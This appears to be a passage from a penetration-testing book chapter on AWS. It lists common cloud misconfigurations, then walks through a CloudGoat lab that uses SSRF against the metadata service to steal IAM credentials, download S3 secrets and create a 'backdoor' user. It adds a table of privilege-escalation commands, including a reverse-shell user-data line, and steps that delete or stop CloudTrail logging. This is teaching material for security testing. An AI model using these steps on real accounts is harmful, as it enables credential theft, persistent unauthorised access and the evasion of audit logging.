      <li class="bulletList"><strong class="keyWord">Excessive public subnets</strong> – The <a id="_idIndexMarker963"/>majority of organizations utilize the default <strong class="keyWord">VPC</strong> (<strong class="keyWord">Virtual Private Cloud</strong>) feature that is <a id="_idIndexMarker964"/>built into AWS <a id="_idIndexMarker965"/>and make few changes when they utilize AWS services, taking the easy approach. However, this approach has been proven dangerous in many cases (an example would be botnet-based crypto-ransomware). Public subnets are accessible by anyone on the internet, potentially exposing something that shouldn’t normally be available. </li>
      <li class="bulletList"><strong class="keyWord">IAM </strong>(<strong class="keyWord">Identity and Access Management</strong>) issues in organizations that do not utilize <a id="_idIndexMarker966"/>two- or multi-factor authentication for high-privileged accounts and utilize a single account for almost <a id="_idIndexMarker967"/>everything, providing the same level of access to all new accounts, putting them at risk. There have been cases where employees’ accounts have been compromised through email phishing leading to massive ransomware attacks that cost the organization almost the same amount of money it would take to rebuild the entire company.</li>
      <li class="bulletList"><strong class="keyWord">Misconfigured S3 buckets</strong> – In the previous section, we explored S3 bucket permission <a id="_idIndexMarker968"/>misconfiguration. This is one of the most common themes noted during cloud <a id="_idIndexMarker969"/>penetration testing. Although buckets are private by default, sometimes IT operations/development teams or the third parties who manage these types of infrastructure tend to make them public. That opens them up to the inevitable threat of adversaries, finding misconfigured S3 buckets with sensitive information such as private keys or unattended files, including backups or log files. </li>
      <li class="bulletList"><strong class="keyWord">Origin servers</strong> – The <a id="_idIndexMarker970"/>majority of <a id="_idIndexMarker971"/>the cloud service providers utilize a <strong class="keyWord">Content Delivery Network</strong> (<strong class="keyWord">CDN</strong>) to distribute content to high-volume <a id="_idIndexMarker972"/>customers. Most of the time, these are misconfigured, leaking the origin of the servers. One of our pentesters gave an example of how this can lead to a security breach. During penetration testing, it is not uncommon to find the origin servers and directly hit their vulnerabilities and even take over the database with brute-force-style attacks. </li>
      <li class="bulletList"><strong class="keyWord">SSRF</strong> (<strong class="keyWord">Server Side Request Forgery</strong>) – This is an attack that can be abused to take <a id="_idIndexMarker973"/>advantage of legitimate AWS functionality and gain access to metadata <a id="_idIndexMarker974"/>information, and if exploited successfully attackers can retrieve valid user credentials for an IAM role. We will explore this attack in this section.</li>
      <li class="bulletList"><strong class="keyWord">DNS records</strong> – Most <a id="_idIndexMarker975"/>of the time, during the initial reconnaissance, attackers can easily identify the S3 bucket <a id="_idIndexMarker976"/>details with the subdomain of the organization. The issue arises when the operations team forgets to update their DNS records in a timely fashion, or even, surprisingly, decommissions unattended S3 buckets still live and available to anyone on the public internet.</li>
    </ul>
    <p class="normal">With all the <a id="_idIndexMarker977"/>information above, we will now set up CloudGoat to create a vulnerable AWS deployment where we will exploit legitimate AWS <a id="_idIndexMarker978"/>functionality by performing an SSRF attack. The following are the step-by-step instructions to perform this attack: </p>
    <ol class="numberedList" style="list-style-type: decimal;">
      <li class="numberedList" value="1">Deploy the vulnerable AWS setup by returning to the CloudGoat Docker image and run <code class="inlineCode">./cloudgoat.py create ec2_ssrf --profile masteringkali</code> in the terminal, and that should set up the infrastructure and provide us with the following confirmation, which includes an access ID and secret key:<figure class="mediaobject"><img src="../Images/B17765_08_33.png" alt=""/></figure>
        <p class="packt_figref">Figure 8.33: Creating the ec2_ssfr AWS environment using CloudGoat</p>
      </li>
      <li class="numberedList">Create an <a id="_idIndexMarker979"/>AWS profile within Kali Linux by running <code class="inlineCode">sudo aws configure ––profile ssrf</code> as shown in <em class="italic">Figure 8.34</em>, and enter the <code class="inlineCode">Access Key ID</code> and <code class="inlineCode">Secret Access Key</code>:<figure class="mediaobject"><img src="../Images/B17765_08_34.png" alt=""/></figure>
        <p class="packt_figref">Figure 8.34: Configuring the AWS profile within Kali Linux</p>
      </li>
      <li class="numberedList">We can enumerate the access privileges of the access key by running the <code class="inlineCode">enumerate-iam</code> tool, which can be directly cloned from Git by running <code class="inlineCode">sudo git clone https://github.com/andresriancho/enumerate-iam</code> and then <code class="inlineCode">cd enumerate-iam</code>. We can install the required packages by running <code class="inlineCode">sudo pip3 install –r requirements.txt</code>. Once it is done, we can run the enumerate tool by entering <code class="inlineCode">sudo python3 enumerate-iam.py ––access-key xx ––secret-key xx</code> as shown in <em class="italic">Figure 8.35</em>. This will provide details such as the associated user, account ID, and other lists of services.<figure class="mediaobject"><img src="../Images/B17765_08_35.png" alt="Text  Description automatically generated"/></figure>
        <p class="packt_figref">Figure 8.35: Enumerating the AWS account with the access and secret keys using enumerate-iam.py</p>
      </li>
      <li class="numberedList">Let’s explore the lambda functions that this ID can access by running <code class="inlineCode">sudo aws lambda list-functions ––profile ssrf ––region us-east-1</code>, which should provide us with a list of accessible lambda functions, as shown in <em class="italic">Figure 8.36</em>:<figure class="mediaobject"><img src="../Images/B17765_08_36.png" alt=""/></figure>
        <p class="packt_figref">Figure 8.36: List of functions in AWS Lambda that is available to the profile</p>
        <div class="note">
          <p class="normal">Users might get an error message when running the above command: <code class="inlineCode">An error occurred (InvalidSignatureException) when calling the ListFunctions operation: Signature expired</code>. This is due to time issues. It is recommended that testers run <code class="inlineCode">sudo apt install ntpupdate</code> <code class="inlineCode">and sudo ntpdate pool.ntp.org</code> in the terminal.</p>
        </div>
      </li>
      <li class="numberedList">Lambda is <a id="_idIndexMarker980"/>exposing an access key and secret key. Let’s get more information about the specific function by running <code class="inlineCode">sudo aws lambda get-function –function-name cg-lambda-cg&lt;randomid&gt; --profile ssrf –region us-east-1</code> in the terminal. That should return more verbose information about this lambda function:<figure class="mediaobject"><img src="../Images/B17765_08_37.png" alt=""/></figure>
        <p class="packt_figref">Figure 8.37: Full details of the specific lambda function with AWS</p>
      </li>
      <li class="numberedList">We will <a id="_idIndexMarker981"/>now configure our Kali Linux with the keys that we got from the lambda functions and call this <code class="inlineCode">lambda-solus</code> as shown in <em class="italic">Figure 8.38</em>:<figure class="mediaobject"><img src="../Images/B17765_08_38.png" alt=""/></figure>
        <p class="packt_figref">Figure 8.38: Configuring the AWS profile within AWS for the new access key from the lambda functions</p>
      </li>
      <li class="numberedList">Let’s <a id="_idIndexMarker982"/>explore the instances that are available for this profile by running <code class="inlineCode">sudo aws ec2 describe-instances –region us-east-1 –profile lambda-solus</code>. That should list the instance details along with the public IP address as shown in <em class="italic">Figure 8.39</em>:<figure class="mediaobject"><img src="../Images/B17765_08_39.png" alt=""/></figure>
        <p class="packt_figref">Figure 8.39: Accessing the cloud instance details through the lambda-solus profile</p>
      </li>
      <li class="numberedList">Once we <a id="_idIndexMarker983"/>have the public IP address, we can access the instance on port <code class="inlineCode">80</code>, and you should be able to see the error message on the server seen in <em class="italic">Figure 8.40</em>:<figure class="mediaobject"><img src="../Images/B17765_08_40.png" alt=""/></figure>
        <p class="packt_figref">Figure 8.40: Accessing the web server on the public IP</p>
      </li>
      <li class="numberedList">Attackers <a id="_idIndexMarker984"/>can choose to run any type of scanner, such as Nikto or OWASP ZAP, on the IP address. When the attackers can trick the web application to make HTTP requests on behalf of them to a specific URL, then the application is vulnerable to SSRF. In our case, adding <code class="inlineCode">/?url=&lt;attacker controlled URL&gt;</code> to the IP address allows us to control the web application to make HTTP requests on our behalf. Let’s use the application to invoke the metadata API to obtain the credentials by adding the URL <code class="inlineCode">http://168.254.169.254/latest/meta-data/iam/security/security-credentials/&lt;Nameofthefile&gt;</code> to the parameter shown in <em class="italic">Figure 8.41</em>, which should retrieve the temporary credentials that can be leveraged by the testers:<figure class="mediaobject"><img src="../Images/B17765_08_41.png" alt=""/></figure>
        <p class="packt_figref">Figure 8.41: Performing an SSRF attack on the web application to retrieve the temporary credentials</p>
      </li>
      <li class="numberedList">Configure <a id="_idIndexMarker985"/>the AWS profile within Kali Linux with another profile by running <code class="inlineCode">sudo aws configure –profile ec2-temp</code> as shown in <em class="italic">Figure 8.42</em>, and additionally, make sure the <code class="inlineCode">aws_session_token</code> is added to the <code class="inlineCode">aws credentials</code> file and then access the S3 buckets by running <code class="inlineCode">sudo aws s3 ls –profile ec2-temp.</code> That provides a bucket called <code class="inlineCode">cg-secret-s3-bucket-&lt;randomid&gt;</code>:<figure class="mediaobject"><img src="../Images/B17765_08_42.png" alt=""/></figure>
        <p class="packt_figref">Figure 8.42: Listing the S3 buckets with the temporary credentials</p>
      </li>
      <li class="numberedList">Let’s download the entire contents of this bucket by running <code class="inlineCode">sudo aws s3 sync s3://&lt;bucketname&gt;&lt;folder&gt;&lt;file&gt; location –profile</code> as shown in the following screenshot. Yay! We now have the high-privileged user access details from this bucket. This is similar to gaining domain administrative access during internal penetration testing:<figure class="mediaobject"><img src="../Images/B17765_08_43.png" alt=""/></figure>
        <p class="packt_figref">Figure 8.43: Downloading the secrets and configuring Kali Linux with the admin profile</p>
      </li>
      <li class="numberedList">After <a id="_idIndexMarker986"/>configuring AWS with the <code class="inlineCode">ec2-admin</code> profile within Kali Linux, attackers will now be able to perform any actions in the EC2 environment. As an example, we can now view all the users by running <code class="inlineCode">sudo aws iam list-users –profile ec2—admin</code> as shown in <em class="italic">Figure 8.44</em>:<figure class="mediaobject"><img src="../Images/B17765_08_44.png" alt="Text  Description automatically generated"/></figure>
        <p class="packt_figref">Figure 8.44: Enumerating the users from the admin profile</p>
      </li>
      <li class="numberedList">View the <a id="_idIndexMarker987"/>attached policies specific to the users by running <code class="inlineCode">sudo iam list-attached-user-policies –username &lt;nameofuser&gt; --profile ec2-admin</code> as shown in <em class="italic">Figure 8.45</em>:<figure class="mediaobject"><img src="../Images/B17765_08_45.png" alt=""/></figure>
        <p class="packt_figref">Figure 8.45: Accessing the user-attached policies</p>
        <div class="note">
          <p class="normal">Note that the following two steps are only for the demonstration purpose of how to create an <code class="inlineCode">aws iam</code> access key and user using the command line. Testers must be aware that if these steps are performed on a CloudGoat deployed AWS environment, then destroying the instance will not be possible since CloudGoat can only delete instances that it creates with the script. </p>
        </div>
      </li>
      <li class="numberedList">You <a id="_idIndexMarker988"/>should now be able to change any user’s secret key by running <code class="inlineCode">sudo iam create-access-key –username &lt;Username&gt; --region us-east-1 –profile ec2-admin</code>:<figure class="mediaobject"><img src="../Images/B17765_08_46.png" alt="Text  Description automatically generated"/></figure>
        <p class="packt_figref">Figure 8.46: Creating a new access key for a user</p>
      </li>
      <li class="numberedList">Additionally, you can create a new user as a backdoor to access the environment by running <code class="inlineCode">sudo aws iam create-user –username backdoor –profile ec2-admin</code>, and that should come up with the new user created with an access key and a secret access key as shown in <em class="italic">Figure 8.47</em>: <figure class="mediaobject"><img src="../Images/B17765_08_47.png" alt="Text  Description automatically generated"/></figure>
        <p class="packt_figref">Figure 8.47: Creating a new user for backdoor access</p>
      </li>
      <li class="numberedList">Testers <a id="_idIndexMarker989"/>can now return to the CloudGoat Docker image and destroy the AWS setup by running <code class="inlineCode">./cloudgoat.py destroy all</code> in the terminal.</li>
    </ol>
    <p class="normal"><em class="italic">Table 8.3</em> provides useful command references that pentesters can leverage during AWS penetration testing: </p>
    <table id="table003-1" class="table-container">
      <tbody>
        <tr>
          <td class="table-cell">
            <p class="normal"><strong class="keyWord">Description</strong></p>
          </td>
          <td class="table-cell">
            <p class="normal"><strong class="keyWord">Command reference</strong></p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal">Creates a new policy version</p>
          </td>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">aws iam create-policy-version –policy-arn target_policy_arn –policy-document file://path/to/ /policy.json –set-as-default</code></p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal">Sets the default policy version to an existing version</p>
          </td>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">aws iam set-default-policy-version –policy-arn target_policy_arn –version-id v2</code></p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal">Creates an EC2 instance with an existing instance profile</p>
          </td>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">aws ec2 run-instances –image-id ami-a4dc46db –instance-type t2.micro –iam-instance-profile Name=iam-full-access-ip –key-name my_ssh_key –security-group-ids sg-123456</code></p>
            <p class="normal"><code class="inlineCode">aws ec2 run-instances –image-id ami-a4dc46db –instance-type t2.micro –iam-instance-profile Name=iam-full-access-ip –user-data file://script/with/reverse/shell.sh</code></p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal">Creates a new user access key</p>
          </td>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">aws iam create-access-key –user-name target_user</code></p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal">Creates a new login profile</p>
          </td>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">aws iam create-login-profile –user-name target_user –password '|[3rxYGGl3@'~68)O{,-$1B"zKejZZ.X1;6T}&lt;XT5isoE=LB2L^G@{uK&gt;f;/CQQeXSo&gt;}th)KZ7v?\\hq.#@dh49″=fT;|,lyTKOLG7J[qH$LV5U&lt;9'O~Z",jJ[iT-D^(' –no-password-reset-required</code></p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal">Updates an existing login profile</p>
          </td>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">aws iam update-login-profile –user-name target_user –password '|[3rxYGGl3@'~68)O{,-$1B"zKejZZ.X1;6T}&lt;XT5isoE=LB2L^G@{uK&gt;f;/CQQeXSo&gt;}th)KZ7v?\\hq.#@dh49″=fT;|,lyTKOLG7J[qH$LV5U&lt;9'O~Z",jJ[iT-D^(' -–no-password-reset-required</code></p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal">Attaches a policy to a: </p>
            <p class="normal">User</p>
            <p class="normal">Group</p>
            <p class="normal">Role</p>
          </td>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">aws iam attach-user-policy –user-name my_username –policy-arn </code></p>
            <p class="normal"><code class="inlineCode">arn:aws:iam::aws:policy/AdministratorAccess aws iam attach-group-policy –group-name group_i_am_in –policy-arn arn:aws:iam::aws:policy/AdministratorAccess</code></p>
            <p class="normal"><code class="inlineCode">aws iam attach-role-policy –role-name role_i_can_assume –policy-arn arn:aws:iam::aws:policy/AdministratorAccess</code></p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal">Creates/updates an inline policy for a:</p>
            <p class="normal">User</p>
            <p class="normal">Group</p>
            <p class="normal">Role</p>
          </td>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">aws iam put-user-policy –user-name my_username –policy-name my_inline_policy –policy-document file://path/to/policy.json</code></p>
            <p class="normal"><code class="inlineCode">aws iam put-group-policy –group-name group_i_am_in –policy-name group_inline_policy –policy-document file://path/to/policy.json&gt;</code></p>
            <p class="normal"><code class="inlineCode">aws iam put-role-policy –role-name role_i_can_assume –policy-name role_inline_policy –policy-document file://path/to/policy.json</code></p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal">Adds a user to a group</p>
          </td>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">aws iam add-user-to-group –-group-name target_group –-user-name username</code></p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal">Updates the <code class="inlineCode">AssumeRolePolicyDocument</code> of a role</p>
          </td>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">aws iam update-assume-role-policy –role-name role_i_can_assume –policy-document file://path/to/assume/role/policy.json</code></p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal">Updates the code of an existing lambda function</p>
          </td>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">aws lambda update-function-code -–function-name target_function –zip-file fileb://my/lambda/code/zipped.zip</code></p>
          </td>
        </tr>
      </tbody>
    </table>
    <figure class="mediaobject">Table 8.3: Useful AWS commands during penetration testing</figure>
    <h1 id="_idParaDest-208" class="heading-1">Obfuscating CloudTrail logs</h1>
    <p class="normal">CloudTrail is a service within Amazon that monitors any actions that are done by users. Assuming <a id="_idIndexMarker990"/>attackers now have high-privileged access to the environment, they will be able to modify the settings by performing the following actions: </p>
    <ol class="numberedList" style="list-style-type: decimal;">
      <li class="numberedList" value="1">Identify the CloudTrail details by running <code class="inlineCode">sudo aws cloudtrail describe-details –profile &lt;profile name&gt;</code>.</li>
      <li class="numberedList">Attackers can choose to perform the removal of trails by running <code class="inlineCode">sudo aws cloudtrail delete-trail --name cloudgoat_trail --profile &lt;Profile name&gt;</code>.</li>
      <li class="numberedList">Alternatively, they can stop the logging by running <code class="inlineCode">sudo aws cloudtrail stop-logging --name cloudgoat_trail --profile &lt;Profile name&gt;</code>. However, it will trigger an alert in GuardDuty (a threat detection service within AWS) about the logs not being captured. </li>
    </ol>
    <p class="normal">We have explored the important aspects of cloud penetration testing with some practical examples. Pentesters should always consider any cloud infrastructure as part of the internal/external scope to ensure that objectives are met. </p>
    <h1 id="_idParaDest-209" class="heading-1">Summary</h1>
    <p class="normal">In this chapter, we took a quick tour of different types of cloud services and attacks against those services. We took a deep dive into AWS-specific security misconfigurations, particularly the exploitation of remote web application vulnerabilities through the logs from the load balancer, and took advantage of a misconfigured S3 bucket to gain access to internal EC2 instances. Further, we exploited the privileges of the instance in gaining the database credentials and also explored metadata service header injection attacks. We learned how to create a backdoor user in an AWS environment through an SSRF attack. We then examined some of the useful command-line functions that can be utilized in AWS penetration testing.</p>
    <p class="normal">In the next chapter, we will focus more on how to bypass <strong class="keyWord">Network Access Control</strong> (<strong class="keyWord">NAC</strong>) and antivirus software, <strong class="keyWord">User Account Control</strong> (<strong class="keyWord">UAC</strong>), and Windows operating system controls. We will also explore toolsets such as the Veil Framework and Shellter.</p>
  </div>
</body></html>